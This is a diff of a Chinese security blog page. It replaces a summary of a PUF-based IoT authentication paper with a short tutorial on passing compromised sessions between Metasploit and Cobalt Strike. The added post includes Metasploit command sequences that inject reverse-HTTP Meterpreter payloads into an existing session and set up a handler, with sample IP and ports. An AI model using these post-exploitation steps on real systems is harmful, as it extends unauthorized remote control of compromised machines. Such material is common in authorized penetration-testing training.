@@ -16,33 +16,34 @@
   <meta name="author" content="Candy">
   <meta name="keywords" content="">
   
-    <meta name="description" content="原文下载：PUF-Based_Authentication_for_the_Security_of_IoT_Devices.pdf 一、研究背景1.1 基于 PUF 的物联网设备威胁基于 PUF 安全系统的主要威胁就是攻击者能够获取挑战的正确响应； 建模攻击是新兴攻击的一个例子，旨在复制PUF的挑战和响应行为，以克隆 PUF 设计生成的秘密密钥。 针对基于物理不可克隆功能（PUF）的物联网设备认证">
+    <meta name="description" content="MSF 传递会话到 CS 首先正常 CS 连接到服务器上  在 CS 上新建一个监听器 Beacon HTTP，具体 ip 配置和监听端口自行修正；  来到获取到会话的 MSF 中，将指定会话传递到 CS 中；  12345678use exploit&#x2F;windows&#x2F;local&#x2F;payload_injectset payload windows&#x2F;meterpreter&#x2F;reverse_https">
 <meta property="og:type" content="article">
-<meta property="og:title" content="基于PUF的物联网设备安全认证">
-<meta property="og:url" content="http://candyb0x.github.io/2024/12/02/%E5%9F%BA%E4%BA%8EPUF%E7%9A%84%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81/index.html">
+<meta property="og:title" content="CS与MSF联动">
+<meta property="og:url" content="http://candyb0x.github.io/2024/12/04/CS%E4%B8%8EMSF%E8%81%94%E5%8A%A8/index.html">
 <meta property="og:site_name" content="Welcome Candy Box">
-<meta property="og:description" content="原文下载：PUF-Based_Authentication_for_the_Security_of_IoT_Devices.pdf 一、研究背景1.1 基于 PUF 的物联网设备威胁基于 PUF 安全系统的主要威胁就是攻击者能够获取挑战的正确响应； 建模攻击是新兴攻击的一个例子，旨在复制PUF的挑战和响应行为，以克隆 PUF 设计生成的秘密密钥。 针对基于物理不可克隆功能（PUF）的物联网设备认证">
+<meta property="og:description" content="MSF 传递会话到 CS 首先正常 CS 连接到服务器上  在 CS 上新建一个监听器 Beacon HTTP，具体 ip 配置和监听端口自行修正；  来到获取到会话的 MSF 中，将指定会话传递到 CS 中；  12345678use exploit&#x2F;windows&#x2F;local&#x2F;payload_injectset payload windows&#x2F;meterpreter&#x2F;reverse_https">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412021438767.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412021438303.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412021438019.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412021438158.png">
-<meta property="article:published_time" content="2024-12-02T06:41:10.000Z">
-<meta property="article:modified_time" content="2024-12-02T06:43:50.076Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256015.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256245.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256590.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256130.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256859.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256305.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256446.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256208.png">
+<meta property="article:published_time" content="2024-12-04T14:57:28.000Z">
+<meta property="article:modified_time" content="2024-12-04T14:58:35.351Z">
 <meta property="article:author" content="Candy">
-<meta property="article:tag" content="PUF">
-<meta property="article:tag" content="物理不可克隆函数">
-<meta property="article:tag" content="身份认证">
-<meta property="article:tag" content="物联网">
-<meta property="article:tag" content="硬件安全">
+<meta property="article:tag" content="工具教程">
+<meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412021438767.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256015.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>基于PUF的物联网设备安全认证 - Welcome Candy Box</title>
+  <title>CS与MSF联动 - Welcome Candy Box</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -220,7 +221,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="基于PUF的物联网设备安全认证"></span>
+            <span id="subtitle" data-typed-text="CS与MSF联动"></span>
           
         </div>
 
@@ -236,8 +237,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-12-02 14:41" pubdate>
-          2024年12月2日 下午
+        <time datetime="2024-12-04 22:57" pubdate>
+          2024年12月4日 晚上
         </time>
       </span>
     
@@ -248,7 +249,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.5k 字
+          154 字
         
       </span>
     
@@ -259,7 +260,7 @@
         
         
         
-          13 分钟
+          2 分钟
         
       </span>
     
@@ -304,110 +305,29 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">基于PUF的物联网设备安全认证</h1>
+            <h1 id="seo-header">CS与MSF联动</h1>
             
             
               <div class="markdown-body">
                 
-                <p>原文下载：<a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2024/pdf/34580676/1732849412850-81b80258-3eea-4412-bb7d-56b82ff9ee8e.pdf">PUF-Based_Authentication_for_the_Security_of_IoT_Devices.pdf</a></p>
-<h1 id="一、研究背景"><a href="#一、研究背景" class="headerlink" title="一、研究背景"></a>一、研究背景</h1><h2 id="1-1-基于-PUF-的物联网设备威胁"><a href="#1-1-基于-PUF-的物联网设备威胁" class="headerlink" title="1.1 基于 PUF 的物联网设备威胁"></a>1.1 基于 PUF 的物联网设备威胁</h2><p>基于 PUF 安全系统的主要威胁就是攻击者能够获取挑战的正确响应；</p>
-<p>建模攻击是新兴攻击的一个例子，旨在复制PUF的挑战和响应行为，以克隆 PUF 设计生成的秘密密钥。</p>
-<p>针对基于物理不可克隆功能（PUF）的物联网设备认证方案的建模攻击被分类为不同的类别。</p>
-<h3 id="1-1-1-机器学习攻击"><a href="#1-1-1-机器学习攻击" class="headerlink" title="1.1.1 机器学习攻击"></a>1.1.1 机器学习攻击</h3><p>机器学习攻击被认为是最成功的复制 PUF 设计行为的攻击，一些基于机器学习的模型攻击已经分析出模仿 PUFs 行为，算法的有效性取决于不同的 PUF 设计的复杂性。</p>
-<h3 id="1-1-2-中间人攻击"><a href="#1-1-2-中间人攻击" class="headerlink" title="1.1.2 中间人攻击"></a>1.1.2 中间人攻击</h3><p>攻击者通过提取和记录服务器和设备之间通信的数据包，并且提取出其中的挑战-响应对(CRPs)进行存储。在获得一组 CRPs 后，可以通过利用机器学习对 PUF 进行建模。</p>
-<h3 id="1-1-3-基于硬件的侧信道攻击"><a href="#1-1-3-基于硬件的侧信道攻击" class="headerlink" title="1.1.3 基于硬件的侧信道攻击"></a>1.1.3 基于硬件的侧信道攻击</h3><p>侧信道攻击利用各种参数，如电流泄漏、电压变化和功耗，对半导体集成电路（IC）和物联网（IoT）设备发起攻击。这些攻击利用侧向挑战参数来模拟稳健的 PUF 设计。</p>
-<h1 id="二、基础组件分析"><a href="#二、基础组件分析" class="headerlink" title="二、基础组件分析"></a>二、基础组件分析</h1><h2 id="2-1-研究成果"><a href="#2-1-研究成果" class="headerlink" title="2.1 研究成果"></a>2.1 研究成果</h2><p><font style="color:rgb(42, 43, 46);">提出了一种轻量级的基于异或环振荡器 PUF （XOR-ROPUF）的物联网系统安全认证方案。</font></p>
-<p><font style="color:rgb(42, 43, 46);">提出的管理方案在验证机构和物联网设备之间进行认证，保证数据的一致性和完整性，降低网络攻击的风险。</font></p>
-<h2 id="2-2-实现方法"><a href="#2-2-实现方法" class="headerlink" title="2.2 实现方法"></a><font style="color:rgb(42, 43, 46);">2.2 实现方法</font></h2><p>使用延迟 PUF 在物联网设备上进行身份认证；</p>
-<h3 id="2-2-1-异或-环振荡器-PUF（XOR-ROPUF）"><a href="#2-2-1-异或-环振荡器-PUF（XOR-ROPUF）" class="headerlink" title="2.2.1 异或-环振荡器 PUF（XOR-ROPUF）"></a>2.2.1 异或-环振荡器 PUF（XOR-ROPUF）</h3><p>提出的 XOR-ROPUF 增强了熵，使设计能够为安全可信的物联网应用生成挑战-响应对，这些应用需要稳健、轻量级的密钥和密码密钥生成。</p>
-<p>轻量级的 PUF 设计，低消耗并且能够安全、有效地为物联网设备生成秘密密钥，包括物联网设备认证的鲁棒性；</p>
-<p>图 2 显示的是已实现的 XOR-ROPUF，从 PUF 生成的响应反馈到挑战生成器。XOR 网络接收来自挑战生成器的挑战，并将响应结合起来生成新的挑战。PUF 设计采用 16 位挑战并生成 16 位响应。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412021438767.png" srcset="/img/loading.gif" lazyload></p>
-<h3 id="2-2-2-基于-PUF-的认证方案"><a href="#2-2-2-基于-PUF-的认证方案" class="headerlink" title="2.2.2 基于 PUF 的认证方案"></a>2.2.2 基于 PUF 的认证方案</h3><p>使用上述提出的轻量级 XOR-ROPUF 进行物联网设备的身份认证，下图是物联网设备与认证服务器之间为确保数据一致性和完整性而提出的方案。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412021438303.png" srcset="/img/loading.gif" lazyload></p>
-<p>所提出的基于 PUF 的物联网设备认证方案降低了认证漏洞的风险，提出的技术可通过与待认证的物联网设备通信来存储和更新挑战与响应对。</p>
-<p>基于 PUF 的认证方案由两个步骤组成，分别是注册和认证，上述保证了认证过程的安全；</p>
-<ol>
-<li>第一阶段：注册</li>
-</ol>
-<p>第一阶段注册的过程中，认证端通过发送 n 个挑战给客户端，获取与之响应的 n 个响应，并将挑战-响应对 CRPs 记录在一个安全的数据库中； 每个客户端都会经过该过程进行注册，具体流程如下图所示；</p>
-<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412021438019.png" srcset="/img/loading.gif" lazyload></p>
-<ol start="2">
-<li>第二阶段：认证</li>
-</ol>
-<p>认证端通过物联网设备的唯一 ID 辨认物联网设备，认证端在从数据库中选取该设备的 CRPs 的任意挑战发送给客户端（物联网设备）获取其响应与数据库中存储的 CRP 进行对比，一致则认为正确；</p>
-<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412021438158.png" srcset="/img/loading.gif" lazyload></p>
-<h1 id="三、研究创新点"><a href="#三、研究创新点" class="headerlink" title="三、研究创新点"></a>三、研究创新点</h1><p><font style="color:rgb(42, 43, 46);">XOR-ROPUF的硬件实现利用FPGA固有的物理特性来实现安全、可靠和可信的物联网应用。</font></p>
-<p><font style="color:rgb(42, 43, 46);">所提出的基于安全PUF的方案消除了传统方法的一些缺点，并解释了如何使用PUF来构建低成本的身份验证方案。提出的基于puf的安全增强方案解决了高安全性物联网网络的需求。</font></p>
-<h1 id="四、实验结果分析"><a href="#四、实验结果分析" class="headerlink" title="四、实验结果分析"></a>四、实验结果分析</h1><h2 id="4-1-实验结果"><a href="#4-1-实验结果" class="headerlink" title="4.1 实验结果"></a>4.1 实验结果</h2><blockquote>
-<p><strong>Art ix 7 FPGAs</strong>指的是 <strong>Xilinx Artix-7 系列现场可编程门阵列（Field Programmable Gate Arrays，FPGAs）</strong></p>
-<ol>
-<li><strong>FPGA 是什么？</strong><ul>
-<li>FPGA 是一种可编程的集成电路，用户可以根据需求设计电路功能。</li>
-<li>它包含可配置逻辑块（CLBs）、存储单元、输入&#x2F;输出单元以及可编程互连。</li>
-</ul>
-</li>
-<li><strong>Artix-7 系列的特点</strong><ul>
-<li><strong>制造工艺</strong>：采用 28nm 制造工艺，具备高性能和低功耗的特性。</li>
-<li><strong>适用场景</strong>：专为功耗敏感的中低端应用设计，例如嵌入式系统、工业控制和信号处理。</li>
-<li><strong>性能优势</strong>：<ul>
-<li>低功耗：相比更高性能的 Kintex 和 Virtex 系列，Artix-7 的功耗更低。</li>
-<li>成本效益：价格较低，适合资源受限的应用。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>主要特性</strong><ul>
-<li>支持可编程逻辑设计，适用于实现 PUF 的复杂逻辑和测量功能。</li>
-<li>提供高速 I&#x2F;O 接口，用于与外部设备通信。</li>
-<li>集成硬核模块（如 DSP 块和存储单元），方便处理数据。</li>
-</ul>
-</li>
-</ol>
-</blockquote>
-<p>在上述认证过程中，只有进行两次挑战-响应验证成果，才认为该物联网设备成功进行身份认证；</p>
-<p>该实验设计是在安装在Diligent Nexys 4板上的Xilinx Artix 7 fpga上实现的， 通过与其他相似设计方案的一致性、唯一性、位混叠、可靠性进行对比，实验结果如下表所示：</p>
-<table>
-<thead>
-<tr>
-<th align="center">设计</th>
-<th align="center"><font style="color:rgb(42, 43, 46);">一致性</font></th>
-<th align="center"><font style="color:rgb(42, 43, 46);">唯一性</font></th>
-<th align="center"><font style="color:rgb(42, 43, 46);">位混叠</font></th>
-<th align="center"><font style="color:rgb(42, 43, 46);">可靠性</font></th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">XOR-ROPUF</td>
-<td align="center">50.76%</td>
-<td align="center">49.40%</td>
-<td align="center">48.35%</td>
-<td align="center">99.8%</td>
-</tr>
-<tr>
-<td align="center">Inverter ROPUF</td>
-<td align="center">47.02%</td>
-<td align="center">45.15%</td>
-<td align="center">47.20%</td>
-<td align="center">98.0%</td>
-</tr>
-<tr>
-<td align="center">ROPUF</td>
-<td align="center">50.56%</td>
-<td align="center">47.24%</td>
-<td align="center">50.56%</td>
-<td align="center">99.14%</td>
-</tr>
-<tr>
-<td align="center">APUF</td>
-<td align="center">55.69%</td>
-<td align="center">7.20%</td>
-<td align="center">19.57%</td>
-<td align="center">99.76%</td>
-</tr>
-</tbody></table>
-<h2 id="4-2-可延展方向"><a href="#4-2-可延展方向" class="headerlink" title="4.2 可延展方向"></a>4.2 可延展方向</h2><p>尝试设计提高一致性、唯一性和位混叠的 PUF 身份认证设计方案；</p>
-<p>主要的修改方向是如何生成挑战-响应对（CRPs）。</p>
+                <h1 id="MSF-传递会话到-CS"><a href="#MSF-传递会话到-CS" class="headerlink" title="MSF 传递会话到 CS"></a>MSF 传递会话到 CS</h1><p> 首先正常 CS 连接到服务器上</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256015.png" srcset="/img/loading.gif" lazyload></p>
+<p>在 CS 上新建一个监听器 Beacon HTTP，具体 ip 配置和监听端口自行修正；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256245.png" srcset="/img/loading.gif" lazyload></p>
+<p>来到获取到会话的 MSF 中，将指定会话传递到 CS 中；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256590.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/local/payload_inject<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http<br><span class="hljs-built_in">set</span> lhost 192.168.48.128   <span class="hljs-comment"># CS服务端IP</span><br><span class="hljs-built_in">set</span> lport 4444       <span class="hljs-comment"># CS服务端监听的端口号</span><br><span class="hljs-built_in">set</span> DisablePayloadHandler True<br><span class="hljs-built_in">set</span> PrependMigrate True<br><span class="hljs-built_in">set</span> session 2  <span class="hljs-comment"># 会话id</span><br>run<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256130.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="CS-传递会话到-MSF"><a href="#CS-传递会话到-MSF" class="headerlink" title="CS 传递会话到 MSF"></a>CS 传递会话到 MSF</h1><p>先在 msf 上启动监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http<br><span class="hljs-built_in">set</span> lhost 192.168.48.128<br><span class="hljs-built_in">set</span> lport 4445<br>run<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256859.png" srcset="/img/loading.gif" lazyload></p>
+<p>在 CS 上船舰一个 Foreign HTTP 监听，IP 和端口设置为 MSF 上监听的 IP 和端口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256305.png" srcset="/img/loading.gif" lazyload></p>
+<p>在 CS 上右键待传递的会话，选择新建会话， 选择刚才创建的 Foreign HTTP 监听器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256446.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412042256208.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
@@ -426,7 +346,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E7%A7%91%E7%A0%94%E8%AE%BA%E6%96%87/" class="category-chain-item">科研论文</a>
+  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-chain-item">内网渗透</a>
   
   
 
@@ -441,15 +361,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/PUF/" class="print-no-link">#PUF</a>
+        <a href="/tags/%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/" class="print-no-link">#工具教程</a>
       
-        <a href="/tags/%E7%89%A9%E7%90%86%E4%B8%8D%E5%8F%AF%E5%85%8B%E9%9A%86%E5%87%BD%E6%95%B0/" class="print-no-link">#物理不可克隆函数</a>
-      
-        <a href="/tags/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/" class="print-no-link">#身份认证</a>
-      
-        <a href="/tags/%E7%89%A9%E8%81%94%E7%BD%91/" class="print-no-link">#物联网</a>
-      
-        <a href="/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/" class="print-no-link">#硬件安全</a>
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
       
     </div>
   
@@ -461,8 +375,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>基于PUF的物联网设备安全认证</div>
-      <div>http://candyb0x.github.io/2024/12/02/基于PUF的物联网设备安全认证/</div>
+      <div>CS与MSF联动</div>
+      <div>http://candyb0x.github.io/2024/12/04/CS与MSF联动/</div>
     </div>
     <div class="license-meta">
       
@@ -474,13 +388,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年12月2日</div>
+          <div>2024年12月4日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2024年12月2日</div>
+          <div>2024年12月4日</div>
         </div>
       
       
@@ -511,18 +425,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/12/04/CS%E4%B8%8EMSF%E8%81%94%E5%8A%A8/" title="CS与MSF联动">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CS与MSF联动</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/11/30/Windows%E7%9A%84NTLM%E8%AE%A4%E8%AF%81%E5%92%8Chash%E6%94%BB%E5%87%BB/" title="Windows的NTLM认证和hash攻击">
-                        <span class="hidden-mobile">Windows的NTLM认证和hash攻击</span>
+                      <a href="/2024/12/02/%E5%9F%BA%E4%BA%8EPUF%E7%9A%84%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81/" title="基于PUF的物联网设备安全认证">
+                        <span class="hidden-mobile">基于PUF的物联网设备安全认证</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
